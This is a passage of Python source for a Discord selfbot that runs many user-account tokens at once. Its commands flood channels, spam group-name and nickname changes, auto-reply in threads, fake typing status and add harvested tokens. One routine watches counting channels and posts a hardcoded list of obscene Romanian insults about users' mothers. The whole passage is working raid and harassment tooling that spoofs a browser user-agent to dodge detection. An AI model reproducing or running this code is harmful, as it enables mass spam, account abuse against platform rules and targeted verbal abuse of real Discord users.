    await send_messages_token_based(ctx,rawmesaje,tokeni,canal,tokeni_noi)

#tokenbased stop
@client_multi_line_spam.command()
async def tokenbasedstop(ctx):
    tokensbased[0] = False
    await ctx.message.delete()

#changegroup
@client_multi_line_spam.command()
async def changegroup(ctx, count=None, grupid = None, *nume: str):
    count = int(count)
    count -= 1
    grupid = int(grupid)
    rawmesaje = nume
    tokensgroup[count] = True
    await ctx.message.delete()
    with open("status.json",'r') as file4:
     data4 = json.load(file4)
    data4[str(count)].append("Change Group Spam")
    with open('status.json','w') as file4:
      json.dump(data4,file4,indent=4)
    await send_messages_change_group(ctx,count,grupid,rawmesaje)

#changenick
@client_multi_line_spam.command()
async def changenick(ctx, count, user:discord.User, *nickuri: str):
    count = int(count)
    count -= 1
    serverid = ctx.message.guild.id
    tokensnick[count] = True
    mentions = user.id
    await ctx.message.delete()
    await send_messages_change_nick(ctx,count,serverid,nickuri,mentions)

@client_multi_line_spam.command()
async def changenickstop(ctx, count=None):
  count = int(count)
  count -= 1
  tokensnick[count] = False
  await ctx.message.delete()
  
#changegroup
@client_multi_line_spam.command()
async def changegroupdelay(ctx, dilei=None):
    delay = int(dilei)
    await ctx.message.delete()
    grupdelay[0] = delay

#changegroupstop
@client_multi_line_spam.command()
async def changegroupstop(ctx, count=None):
    count = int(count)
    count -= 1 
    await ctx.message.delete()
    try:
     with open("status.json",'r') as file4:
      data4 = json.load(file4)
     data4[str(count)].remove("Change Group Spam")
     with open('status.json','w') as file4:
       json.dump(data4,file4,indent=4)
    except Exception:
        pass
    tokensgroup[count] = False

#replystart
@client_multi_line_spam.command()
async def replystart(ctx, channel_id = None, msg_id = None, *, mesaj):
 channel_id = int(channel_id)
 msg_id = int(msg_id)
 tokensreply[0] = True
 thred = threading.Thread(target=send_with_retry_reply, args=(channel_id, msg_id, mesaj),daemon=True)
 await ctx.message.delete()
 thred.start()

#replystop
@client_multi_line_spam.command()
async def replystop(ctx, toljavan=None):
    tokensreply[0] = False
    await ctx.message.delete()

#replydelay
@client_multi_line_spam.command()
async def replydelay(ctx, dileyut = None):
    dilei = int(dileyut)
    tokenreplydelay[0] = dilei
    await ctx.message.delete()

# repeated message spam commands

#start
@client_repeated_message_spam.command()
async def start(ctx,count=None, *, message):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages',headers={"authorization":token},json={"content":"# `Please specify a token number with the form: {command}start {token number} {optional tag}`"})
     return
    count = int(count)
    count -= 1
    tokens[count] = True
    with open("status.json",'r') as file4:
     data4 = json.load(file4)
    data4[str(count)].append("Repeated Message Spam")
    with open('status.json','w') as file4:
      json.dump(data4,file4,indent=4)
    await repeated_message_spam(ctx,count,message)

#startpreset
@client_repeated_message_spam.command()
async def startpreset(ctx,count=None,preset_name=None):
    count = int(count)
    count -= 1
    with open("presets.json",'r') as file3:
     preseturi = json.load(file3)
    try:
        preseturi[preset_name]
    except Exception:
        await ctx.send("# Preset not found")
        return
    mesaj = preseturi[preset_name]
    tokenspreset[count] = True
    with open("status.json",'r') as file4:
     data4 = json.load(file4)
    data4[str(count)].append("Preset Spam")
    with open('status.json','w') as file4:
      json.dump(data4,file4,indent=4)
    await repeated_message_spam2(ctx,count,mesaj)

@client_repeated_message_spam.command()
async def stoppreset(ctx,count=None):
    count = int(count)
    count -= 1
    tokenspreset[count] = False
    try:
     with open("status.json",'r') as file4:
      data4 = json.load(file4)
     data4[str(count)].remove("Preset Spam")
     with open('status.json','w') as file4:
       json.dump(data4,file4,indent=4)
    except Exception:
        pass
    await ctx.message.delete()

@client_repeated_message_spam.command()
async def stopreset(ctx,count=None):
    count = int(count)
    count -= 1
    tokenspreset[count] = False
    try:
     with open("status.json",'r') as file4:
      data4 = json.load(file4)
     data4[str(count)].remove("Preset Spam")
     with open('status.json','w') as file4:
       json.dump(data4,file4,indent=4)
    except Exception:
        pass
    await ctx.message.delete()

@client_repeated_message_spam.command()
async def addpreset(ctx, preset_name,*, preset_content):
    preset_content = str(preset_content)
    with open("presets.json",'r') as file3:
     preseturi = json.load(file3)
    preseturi[preset_name] = preset_content
    with open("presets.json",'w') as file4:
        json.dump(preseturi,file4,indent=4)
    await ctx.message.delete()

@client_repeated_message_spam.command()
async def changepreset(ctx, preset_name,* , preset_content):
    with open("presets.json",'r') as file3:
     preseturi = json.load(file3)
    try:
        preseturi[preset_name]
    except Exception:
        await ctx.send("# Preset not found")
    preseturi[preset_name] = preset_content
    await ctx.message.delete()
    with open("presets.json",'w') as file4:
        json.dump(preseturi,file4,indent=4)

@client_repeated_message_spam.command()
async def deletepreset(ctx, preset_name):
    with open("presets.json",'r') as file3:
     preseturi = json.load(file3)
    try:
        preseturi[preset_name]
    except Exception:
        await ctx.send("# Preset not found")
    preseturi.pop(preset_name)
    await ctx.message.delete()
    with open("presets.json",'w') as file4:
        json.dump(preseturi,file4,indent=4)

@client_repeated_message_spam.command()
async def clearpresets(ctx, count=None):
 mt = {}
 with open('presets.json','w') as file:
   json.dump(mt,file,indent=4)
 await ctx.message.delete()

@client_repeated_message_spam.command()
async def showpresets(ctx, count13=None):
    count13 = int(count13)
    count13 -= 1
    with open("presets.json",'r') as file3:
     preseturi = json.load(file3)
    mesajel = "\n".join([f"`-` **{i}**: {j}" for i, j in preseturi.items()])
    content = f'{mesajel}'
    if content != "":
     requests.post(f"https://discord.com/api/v10/channels/{ctx.channel.id}/messages"
                       , headers={"Authorization":tokenspreset2[count13]}, json={"content": f"# LIST OF PRESETS \n{content}"} ) 
     return
    else:
       requests.post(f"https://discord.com/api/v10/channels/{ctx.channel.id}/messages"
                       , headers={"Authorization":tokenspreset2[count13]}, json={"content": f"# no presets found"} ) 
       return 


#startchannel
@client_repeated_message_spam.command()
async def startchannel(ctx,count=None,canalid=None, *, message):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}start {token number} {channel id} {optional tag}`"})
     return
    if canalid == None:
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                      ,headers={"authorization":token}
                      ,json={"content":"# `Please specify a channel id with the form: {command}start {token number} {channel id} {optional tag}`"})
        return
    count = int(count)
    count -= 1
    tokenschannel1[count] = True
    with open("status.json",'r') as file4:
     data4 = json.load(file4)
    data4[str(count)].append("Repeated Message Channel Spam")
    with open('status.json','w') as file4:
      json.dump(data4,file4,indent=4)
    await repeated_message_spam_channel(ctx,count,message,canalid)

#startall
@client_repeated_message_spam.command()
async def startall(ctx, *, message):
    for i in range(len(tokens)):
        tokens5[i] = True
    await ctx.message.delete()
    thred = threading.Thread(target=send_with_retry_startall3
                             ,args=(ctx,message)
                             ,daemon=True)
    thred.start()

#typing
@client_repeated_message_spam.command()
async def typing(ctx, count=None, choice=None):
    await ctx.message.delete()
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}start {token number} {optional tag}`"})
     return
    optiuni = ["true","TRUE","True","false","FALSE","False"]
    optiuniadv = ["true","TRUE","True",]
    optiunineadv = ["false","FALSE","False"]
    if choice not in optiuni:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Invalid parameter, value must be equal to False or True `"})
     return
    count = int(count)
    count -= 1
    if choice in optiuniadv:
     tokenstyping3[count] = True
    elif choice in optiunineadv:
     tokenstyping3[count] = False

#typingall
@client_repeated_message_spam.command()
async def typingall(ctx, choice=None):
    await ctx.message.delete()
    optiuni = ["true","TRUE","True","false","FALSE","False"]
    optiuniadv = ["true","TRUE","True",]
    optiunineadv = ["false","FALSE","False"]
    if choice not in optiuni:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Invalid parameter, value must be equal to False or True `"})
     return
    if choice in optiuniadv:
     for i in range(len(tokens)):
      tokenstyping3[i] = True
    elif choice in optiunineadv:
     for i in range(len(tokens)):
      tokenstyping3[i] = False

#delay
@client_repeated_message_spam.command()
async def delay(ctx, count=None, delay1=None):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages',
                   headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}start {token number} {optional tag}`"})
     return
    count = int(count)
    count -= 1
    delay1 = int(delay1)
    tokensdelay3[count] = delay1
    await ctx.message.delete()

#delayall
@client_repeated_message_spam.command()
async def delayall(ctx, delay2=None):
    await ctx.message.delete()
    for i in range(len(tokens)):
        tokensdelay3[i] = int(delay2)

# spiced up multi line commands

#start
@client_spiced_multi_line_spam.command()
async def start(ctx,count=None,*user_mentions:discord.User):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}start {token number} {optional tag}`"})
     return
    count = int(count)
    count -= 1
    tokens[count] = True
    await ctx.message.delete()
    with open("status.json",'r') as file4:
     data4 = json.load(file4)
    data4[str(count)].append("Spiced Up Multi Line Spam")
    with open('status.json','w') as file4:
      json.dump(data4,file4,indent=4)
    await send_spiced_multi_line_spam(ctx,user_mentions,count)

#startchannel
@client_spiced_multi_line_spam.command()
async def startchannel(ctx,count=None,canalid=None,*user_mentions:discord.User):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token},json={"content":"# `Please specify a token number with the form: {command}start {token number} {channel id} {optional tag}`"})
     return
    if canalid == None:
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                      ,headers={"authorization":token},json={"content":"# `Please specify a channel id with the form: {command}start {token number} {channel id} {optional tag}`"})
        return
    count = int(count)
    count -= 1
    tokenschannel1[count] = True
    await ctx.message.delete()
    with open("status.json",'r') as file4:
     data4 = json.load(file4)
    data4[str(count)].append("Spiced Up Multi Line Channel Spam")
    with open('status.json','w') as file4:
      json.dump(data4,file4,indent=4)
    await send_spiced_multi_line_spam_channel(ctx,user_mentions,count,canalid)

#startall
@client_spiced_multi_line_spam.command()
async def startall(ctx,*user_mentions:discord.User):
    for i in range(len(tokens)):
        tokens6[i] = True
    await ctx.message.delete()
    thred = threading.Thread(target=send_with_retry_startall4
                             ,args=(ctx,user_mentions)
                             ,daemon=True)
    thred.start()

#typing
@client_spiced_multi_line_spam.command()
async def typing(ctx, count=None, choice=None):
    await ctx.message.delete()
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}start {token number} {optional tag}`"})
     return
    optiuni = ["true","TRUE","True","false","FALSE","False"]
    optiuniadv = ["true","TRUE","True",]
    optiunineadv = ["false","FALSE","False"]
    if choice not in optiuni:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Invalid parameter, value must be equal to False or True `"})
     return
    count = int(count)
    count -= 1
    if choice in optiuniadv:
     tokenstyping4[count] = True
    elif choice in optiunineadv:
     tokenstyping4[count] = False

#typingall
@client_spiced_multi_line_spam.command()
async def typingall(ctx, choice=None):
    await ctx.message.delete()
    optiuni = ["true","TRUE","True","false","FALSE","False"]
    optiuniadv = ["true","TRUE","True",]
    optiunineadv = ["false","FALSE","False"]
    if choice not in optiuni:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Invalid parameter, value must be equal to False or True `"})
     return
    if choice in optiuniadv:
     for i in range(len(tokens)):
      tokenstyping4[i] = True
    elif choice in optiunineadv:
     for i in range(len(tokens)):
      tokenstyping4[i] = False

#delay
@client_spiced_multi_line_spam.command()
async def delay(ctx, count=None, delay1=None):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}start {token number} {optional tag}`"})
     return
    count = int(count)
    count -= 1
    delay1 = int(delay1)
    tokensdelay4[count] = delay1
    await ctx.message.delete()

#delayall    
@client_spiced_multi_line_spam.command()
async def delayall(ctx, delay2=None):
    await ctx.message.delete()
    for i in range(len(tokens)):
        tokensdelay4[i] = int(delay2)

# single line spam stop commands

#stop
@client_single_line_spam.command()
async def stop(ctx,count=None):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}stop {token number}`"})
     return
    count = int(count)
    count -= 1
    if count > len(tokens):
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                      ,headers={"authorization":token}
                      ,json={"content":f"# `Token index out of range: {len(tokens)} tokens`"})
        return
    tokens[count] = False
    try:
     with open("status.json",'r') as file4:
      data4 = json.load(file4)
     data4[str(count)].remove("Single Line Spam")
     with open('status.json','w') as file4:
       json.dump(data4,file4,indent=4)
    except Exception:
        pass
    await ctx.message.delete()

#stopchannel
@client_single_line_spam.command()
async def stopchannel(ctx,count=None):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}stop {token number}`"})
     return
    count = int(count)
    count -= 1
    if count > len(tokens):
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                      ,headers={"authorization":token}
                      ,json={"content":f"# `Token index out of range: {len(tokens)} tokens`"})
        return
    tokenschannel1[count] = False
    try:
     with open("status.json",'r') as file4:
      data4 = json.load(file4)
     data4[str(count)].remove("Single Line Channel Spam")
     with open('status.json','w') as file4:
       json.dump(data4,file4,indent=4)
    except Exception:
        pass
    await ctx.message.delete()
    
#stopall   
@client_single_line_spam.command()
async def stopall(ctx):
    for i in range(len(tokens)):
        tokens3[i] = False
    await ctx.message.delete()

# multi line spam stop commands

#stop
@client_multi_line_spam.command()
async def stop(ctx,count=None):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}stop {token number}`"})
     return
    count = int(count)
    count -= 1
    if count > len(tokens):
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                      ,headers={"authorization":token}
                      ,json={"content":f"# `Token index out of range: {len(tokens)} tokens`"})
        return
    tokens[count] = False
    try:
     with open("status.json",'r') as file4:
      data4 = json.load(file4)
     data4[str(count)].remove("Multi Line Spam")
     with open('status.json','w') as file4:
       json.dump(data4,file4,indent=4)
    except Exception:
        pass
    await ctx.message.delete()

#stopchannel
@client_multi_line_spam.command()
async def stopchannel(ctx,count=None):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}stop {token number}`"})
     return
    count = int(count)
    count -= 1
    if count > len(tokens):
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                      ,headers={"authorization":token}
                      ,json={"content":f"# `Token index out of range: {len(tokens)} tokens`"})
        return
    tokenschannel1[count] = False
    try:
     with open("status.json",'r') as file4:
      data4 = json.load(file4)
     data4[str(count)].remove("Multi Line Channel Spam")
     with open('status.json','w') as file4:
       json.dump(data4,file4,indent=4)
    except Exception:
        pass
    await ctx.message.delete()

#stopall
@client_multi_line_spam.command()
async def stopall(ctx):
    for i in range(len(tokens)):
        tokens4[i] = False
    await ctx.message.delete()

#stopnotepad
@client_multi_line_spam.command()
async def stopnotepad(ctx, count=None):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}stop {token number}`"})
     return
    count = int(count)
    count -= 1
    if count > len(tokens):
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                      ,headers={"authorization":token}
                      ,json={"content":f"# `Token index out of range: {len(tokens)} tokens`"})
        return
    tokens_notepad[count] = False
    try:
     with open("status.json",'r') as file4:
      data4 = json.load(file4)
     data4[str(count)].remove("Notepad Spam")
     with open('status.json','w') as file4:
       json.dump(data4,file4,indent=4)
    except Exception:
        pass
    await ctx.message.delete()

#stopnotepadshift
@client_multi_line_spam.command()
async def stopnotepadshift(ctx, count=None):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}stop {token number}`"})
     return
    count = int(count)
    count -= 1
    if count > len(tokens):
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                      ,headers={"authorization":token}
                      ,json={"content":f"# `Token index out of range: {len(tokens)} tokens`"})
        return
    tokens_notepad[count] = False
    try:
     with open("status.json",'r') as file4:
      data4 = json.load(file4)
     data4[str(count)].remove("Notepad Shift Enter Spam")
     with open('status.json','w') as file4:
       json.dump(data4,file4,indent=4)
    except Exception:
        pass
    await ctx.message.delete()

# repeated message spam stop commands

#stop
@client_repeated_message_spam.command()
async def stop(ctx,count=None):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}stop {token number}`"})
     return
    count = int(count)
    count -= 1
    if count > len(tokens):
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                      ,headers={"authorization":token}
                      ,json={"content":f"# `Token index out of range: {len(tokens)} tokens`"})
        return
    tokens[count] = False
    try:
     with open("status.json",'r') as file4:
      data4 = json.load(file4)
     data4[str(count)].remove("Repeated Message Spam")
     with open('status.json','w') as file4:
       json.dump(data4,file4,indent=4)
    except Exception:
        pass
    await ctx.message.delete()

#stopchannel
@client_repeated_message_spam.command()
async def stopchannel(ctx,count=None):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}stop {token number}`"})
     return
    count = int(count)
    count -= 1
    if count > len(tokens):
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                      ,headers={"authorization":token}
                      ,json={"content":f"# `Token index out of range: {len(tokens)} tokens`"})
        return
    tokenschannel1[count] = False
    try:
     with open("status.json",'r') as file4:
      data4 = json.load(file4)
     data4[str(count)].remove("Repeated Message Channel Spam")
     with open('status.json','w') as file4:
       json.dump(data4,file4,indent=4)
    except Exception:
        pass
    await ctx.message.delete()

#stopall
@client_repeated_message_spam.command()
async def stopall(ctx):
    for i in range(len(tokens)):
        tokens5[i] = False
    await ctx.message.delete()

# spiced up multi line spam stop commands

#stop
@client_spiced_multi_line_spam.command()
async def stop(ctx,count=None):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}stop {token number}`"})
     return
    count = int(count)
    count -= 1
    if count > len(tokens):
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                      ,headers={"authorization":token}
                      ,json={"content":f"# `Token index out of range: {len(tokens)} tokens`"})
        return
    tokens[count] = False
    try:
     with open("status.json",'r') as file4:
      data4 = json.load(file4)
     data4[str(count)].remove("Spiced Up Multi Line Spam")
     with open('status.json','w') as file4:
       json.dump(data4,file4,indent=4)
    except Exception:
        pass
    await ctx.message.delete()

#stopchannel
@client_spiced_multi_line_spam.command()
async def stopchannel(ctx,count=None):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}stop {token number}`"})
     return
    count = int(count)
    count -= 1
    if count > len(tokens):
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                      ,headers={"authorization":token}
                      ,json={"content":f"# `Token index out of range: {len(tokens)} tokens`"})
        return
    tokenschannel1[count] = False
    try:
     with open("status.json",'r') as file4:
      data4 = json.load(file4)
     data4[str(count)].remove("Spiced Up Multi Line Channel Spam")
     with open('status.json','w') as file4:
       json.dump(data4,file4,indent=4)
    except Exception:
        pass
    await ctx.message.delete()

#stopall
@client_spiced_multi_line_spam.command()
async def stopall(ctx):
    for i in range(len(tokens)):
        tokens6[i] = False
    await ctx.message.delete()

# token checking commands

#tokenlist
@client_multi_line_spam.command()
async def tokenlist(ctx):
    requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                  ,headers={"authorization":token}
                  ,json={"content":f"# `{len(tokens)} tokens in tokens.txt`"})
    return

#tokenuser
@client_multi_line_spam.command()
async def tokenuser(ctx):
    for mata in usernameuri:
        pass
    requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                  ,headers={"authorization":token}
                  ,json={"content":f"`{mata}`"})
    return

#comenzi
@client_multi_line_spam.command()
async def comenzi(ctx):
    for i in comendute:
        pass
    requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                  ,headers={"Authorization":token}
                  ,json={"content":i})
    return

#token
@client_multi_line_spam.command()
async def addtoken(ctx, toljavan=None):
    toljavan = str(toljavan)
    verified_token = new_main_token_validation(toljavan)
    await ctx.message.delete()
    if not verified_token:
        return
    aux = open("tokens.txt",'r').read().splitlines()
    if verified_token in aux:
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                  ,headers={"Authorization":token}
                  ,json={"content":"`Token is invalid`"})
        return
    requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                  ,headers={"Authorization":token}
                  ,json={"content":"Token has been succesfully validated."})
    with open('tokens.txt','a') as file:
        file.write(f"\n{verified_token}")
    tokens.append(verified_token)
    tokens2.append(verified_token)
    tokens3.append(verified_token)
    tokens4.append(verified_token) 
    tokens5.append(verified_token) 
    tokens6.append(verified_token) 
    tokensdelay1.append(verified_token) 
    tokensdelay2.append(verified_token) 
    tokensdelay3.append(verified_token) 
    tokensdelay4.append(verified_token) 
    tokenstyping1.append(verified_token) 
    tokenstyping2.append(verified_token) 
    tokenstyping3.append(verified_token) 
    tokenstyping4.append(verified_token) 
    tokenschannel1.append(verified_token)
    tokenschannel2.append(verified_token)
    tokenschannel3.append(verified_token)
    tokenschannel4.append(verified_token)
    tokensglobaltyping.append(verified_token) 
    tokensstreaming.append(verified_token) 
    tokenstreams.append(verified_token)
    big_text.append(verified_token)
    tokens_notepad.append(verified_token) 
    tokens_notepad2.append(verified_token) 
    tokens_afkcheck.append(verified_token)
    tokens_afkcheck2.append(verified_token)
    tokensreact.append(verified_token) 
    tokensbased.append(verified_token) 
    tokensbased2.append(verified_token)
    tokensgroup.append(verified_token) 
    tokensgroup2.append(verified_token)
    tokensfast.append(verified_token)

#addnotepad
@client_multi_line_spam.command()
async def addnotepad(ctx, mata):
    await ctx.message.delete()
    if ctx.message.attachments:
        for attachment in ctx.message.attachments:
            if attachment.filename.endswith('.txt'):
                async with aiohttp.ClientSession() as session:
                    async with session.get(attachment.url) as resp:
                        if resp.status == 200:
                            continut = await resp.text()
                            fisier = f"{mata}"
                        with open(fisier, 'w') as sugikurt:
                            sugikurt.write(continut)

def mesaje(mesajut,message_after,channel_id,count):
    payload = {
        'content': mesajut, 
        'tts':False
    }
    headers = {
        'authorization': tokensreplyafk2[count],
        "user-agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    }
    payload['message_reference'] = {
        "channel_id": channel_id,
        "message_id": message_after
    }
    r = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=payload)

        
def checkConsecutive(nr):
    if len(nr) == 1:
        return False
    return sorted(nr) == list(range(min(nr), max(nr)+1))

def send_messages_afk_checkk(count,url,header,channel_id):
    lista = []
    message_after = ""
    same_message = False
    message_author_after = ""
    raspunsuri = ['cate suge mata?','ce numeri acolo bagamiasi pulan morti tai','nu mai numara ca snt la mata ;))))))','sati iau toti morti in pula cu numaratoarea mati'
                  ,'sunt aici curvo','cate suge mata?','te fut rau !']
    while tokensreplyafk[count]:
     if not tokensreplyafk[count]:
         return
     try:
      message_body = requests.get(url, headers=header)
      message_body = message_body.json()[0]
      message_author_before = message_body["author"]["id"]
      message_before = message_body["id"]
      message_content = message_body["content"]
      message_author_username = message_body["author"]["username"]
      message_author_tag = message_body["author"]["discriminator"]
      message_after = message_body["id"]
      message_author_after = message_body["author"]["id"]
      numere = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36'
                , '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50'
                , '51', '52', '53', '54', '55', '56', '57', '58', '59', '60', '61', '62', '63', '64', '65', '66', '67', '68', '69', '70', '71', '72', '73', '74', '75'
                , '76', '77', '78', '79', '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99']
     except Exception:
         continue
     if message_author_after != message_author_before:
         print("—"*25) 
     if message_after != message_before:
         print(f"{Fore.RED}{message_author_username}{Fore.BLUE}#{message_author_tag}{Style.RESET_ALL} : {message_content}")
     if message_content in numere:
         lista.append(int(message_content))
     if message_content not in numere:
        lista = []               
     if str(message_content) == str(random.randint(70,90)):
         x = checkConsecutive(set(lista))
         if x == True:
          mesaje(random.choice(raspunsuri),message_after,channel_id,count)
          continue  
         if x == False:
           pass
    
#afkcheckrespond
@client_multi_line_spam.command()
async def afkcheckrespond(ctx, count=None, channel_id=None):
    count = int(count)
    count -= 1
    channel_id = int(channel_id)
    tokensreplyafk[count] = True
    header = {
        "authorization" : tokensreplyafk2[count],
        "user-agent" : f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        }
    url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
    await ctx.message.delete()
    thredut = threading.Thread(target=send_messages_afk_checkk,args=(count,url,header,channel_id),daemon=True)
    thredut.start()

@client_multi_line_spam.command()
async def afkcheckrespondstop(ctx, count=None):
    count = int(count)
    count -= 1
    tokensreplyafk[count] = False

mt = {}
with open('data.json','w') as file:
  json.dump(mt,file,indent=4)
with open('data2.json','w') as file2:
  json.dump(mt,file2,indent=4)
with open('data3.json','w') as file3:
  json.dump(mt,file3,indent=4)
with open('data4.json','w') as file4:
  json.dump(mt,file4,indent=4)

def mata(count,channel_id,mesaj):
    with open("data3.json",'r') as file3:
     data3 = json.load(file3)
    if data3[mesaj] == 0:
        pass
    else:
        return
    if not tokensreplyafk3[count]:
        return
    with open("data2.json",'r') as file2:
      data2 = json.load(file2)
    if data2[mesaj] != channel_id:
        r = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers={"authorization":tokens[count]}, json={'content':'`same token and same message can only be used in one channel`'})
    while True:
     if not tokensreplyafk3[count]:
         return
     try:
      with open("data.json",'r') as file:
       data = json.load(file)
     except Exception as e:
         print(f"problema: {e}")
         return
     try:
        with open("data2.json",'r') as file22:
         data22 = json.load(file22)
     except Exception:
         print(f"problema: {e}")
         return
     header = {
         "authorization" : tokensreplyafk4[count],
         "user-agent" : f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
         }
     url = f"https://discord.com/api/v9/channels/{data22[mesaj]}/messages"
     message_after = ""
     same_message = False
     message_author_after = ""  
     try:
      message_body = requests.get(url, headers=header)
      message_body = message_body.json()[0]
      message_author_before = message_body["author"]["id"]
      message_before = message_body["id"]
      message_content = message_body["content"]
      message_author_username = message_body["author"]["username"]
      message_author_tag = message_body["author"]["discriminator"]
      message_after = message_body["id"]
      message_author_after = message_body["author"]["id"]
     except Exception:
         continue
     if message_author_after != message_author_before:
         print("â"*25)
     if message_after != message_before:
         print(f"{Fore.RED}{message_author_username}{Fore.BLUE}#{message_author_tag}{Style.RESET_ALL} : {message_content}")
     if message_content == mesaj or message_content.lower() == mesaj:
         try:
          payload = {
          'content': data[mesaj], 
          'tts':False
          }
         except Exception:
            continue
         headers = {
             'authorization': tokensreplyafk4[count],
             "user-agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
         }
         payload['message_reference'] = {
             "channel_id": data22[mesaj],
             "message_id": message_after
         }
         try:
          r = requests.post(f"https://discord.com/api/v9/channels/{data22[mesaj]}/messages", headers=headers, json=payload)
         except Exception:
            continue

@client_multi_line_spam.command()
async def customresponse(ctx, count=None, channel_id=None, mesaj=None, *, response):
    count = int(count)
    count -= 1
    channel_id = int(channel_id)
    tokensreplyafk3[count] = True
    await ctx.message.delete()
    with open("data.json",'r') as file:
     data = json.load(file)
    if mesaj in data:
        await ctx.send(f"# same message can't be used twice, please run the > $customresponsestop {mesaj} < command to remove the original message")
    data[mesaj] = response
    with open('data.json','w') as file:
     json.dump(data,file,indent=4)
    with open("data3.json",'r') as file3:
